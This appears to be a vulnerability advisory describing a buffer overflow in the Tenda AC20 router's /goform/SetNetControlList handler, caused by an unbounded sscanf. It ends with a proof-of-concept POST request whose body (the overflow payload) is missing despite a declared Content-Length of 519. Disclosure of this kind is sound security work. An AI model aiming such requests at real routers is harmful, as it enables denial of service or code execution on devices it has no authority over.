# Information



**Vendor of the products:**   Shenzhen Tenda Technology Co.,Ltd.

**Vendor's website:**https://www.tenda.com.cn/

**Affected products:** AC20

**Affected firmware version:** <= V16.03.08.12 (latest)

**Firmware download address:** [tenda.com.cn/material/show/3264](https://www.tenda.com.cn/material/show/3264)

# Overview

A buffer overflow vulnerability was discovered on the latest version of the Tengda AC20 router, V16.03.08.12, where an attacker sent a carefully constructed http post packet to the request path /goform/SetNetControlList triggered, resulting in a denial of service attack or even RCE, specifically through the function sscanf(s_1, "; %[^; ]; %[^; ]; %[^; ]; %[^; ]; ", &v9, Var, nptr, nptr_1); implemented, because there is no boundary check on the s_1

# Vulnerability details

Here we take the value of the list

![image-20250801160219234](2/image-20250801160219234.png)

set_qosMib_list function gets the value of the list, but the sscanf function below does not perform bounds checking, resulting in an overflow

![image-20250801160156286](2/image-20250801160156286.png)

# POC

```
POST /goform/SetNetControlList HTTP/1.1
Host: 192.168.102.145
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: */*
X-Requested-With: XMLHttpRequest
Referer: http://192.168.102.145/main.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 519


```
